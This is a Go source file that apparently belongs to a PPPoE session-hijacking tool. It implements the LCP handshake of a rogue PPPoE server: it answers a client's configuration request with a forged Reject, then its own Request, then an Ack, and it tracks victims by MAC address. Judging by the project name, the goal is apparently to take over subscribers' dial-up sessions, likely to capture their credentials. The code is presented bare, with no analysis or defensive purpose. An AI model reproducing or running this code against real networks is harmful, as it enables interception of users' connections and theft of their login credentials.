package actions

import (
	"fmt"
	"github.com/LuckyC4t/pppoe-hijack-go/internal/global"
	"github.com/LuckyC4t/pppoe-hijack-go/internal/packets"
	"github.com/google/gopacket/layers"
)

var clientMap = make(map[string]struct{})

func sendLcpReq(eth *layers.Ethernet, ppp *layers.PPP) {
	// LCP Configuration Request
	if ppp.Payload[0] == 1 {
		fmt.Println("\nReceived LCP-Config-Req")

		if _, has := clientMap[eth.SrcMAC.String()]; !has {
			sendLcpRejectPacket(eth, ppp)
			sendLcpReqPacket(eth, ppp)

			clientMap[eth.SrcMAC.String()] = struct{}{}
		}

		sendLcpAckPacket(eth, ppp)
	}
	//if raw[8] == 1 {
	//	fmt.Println("\nReceived LCP-Config-Req")
	//	if _, has := clientMap[srcMAC.String()]; !has {
	//		sendLcpRejectPacket(srcMAC, raw)
	//		sendLcpReqPacket(srcMAC, raw)
	//
	//		clientMap[srcMAC.String()] = struct{}{}
	//	}
	//	sendLcpAckPacket(srcMAC, raw)
	//}
}

func sendLcpRejectPacket(eth *layers.Ethernet, ppp *layers.PPP) {
	payload := ppp.Payload
	payload[0] = 0x04

	payload = append(ppp.Contents, payload...)
	length := len(payload)

	packet := packets.Packet{
		DstMac:    eth.SrcMAC,
		Payload:   payload,
		Code:      layers.PPPoECodeSession,
		SessionId: 0x01,
		Protocol:  layers.EthernetTypePPPoESession,
		Length:    uint16(length),
	}

	packet.Send()
	fmt.Println("send LCP Reject packet...")
}

func sendLcpReqPacket(eth *layers.Ethernet, ppp *layers.PPP) {
	payload := append(ppp.Contents, global.LCPREQ_PAYLOAD...)
	length := len(payload)

	packet := packets.Packet{
		DstMac:    eth.SrcMAC,
		Payload:   payload,
		Code:      layers.PPPoECodeSession,
		SessionId: 0x01,
		Protocol:  layers.EthernetTypePPPoESession,
		Length:    uint16(length),
	}

	packet.Send()
	fmt.Println("send LCP Request packet...")
}

func sendLcpAckPacket(eth *layers.Ethernet, ppp *layers.PPP) {
	payload := ppp.Payload
	payload[0] = 0x02

	payload = append(ppp.Contents, payload...)
	length := len(payload)

	p := packets.Packet{
		DstMac:    eth.SrcMAC,
		Payload:   payload,
		Code:      layers.PPPoECodeSession,
		SessionId: 0x01,
		Protocol:  layers.EthernetTypePPPoESession,
		Length:    uint16(length),
	}

	p.Send()
	fmt.Println("send LCP Ack packet...")
}
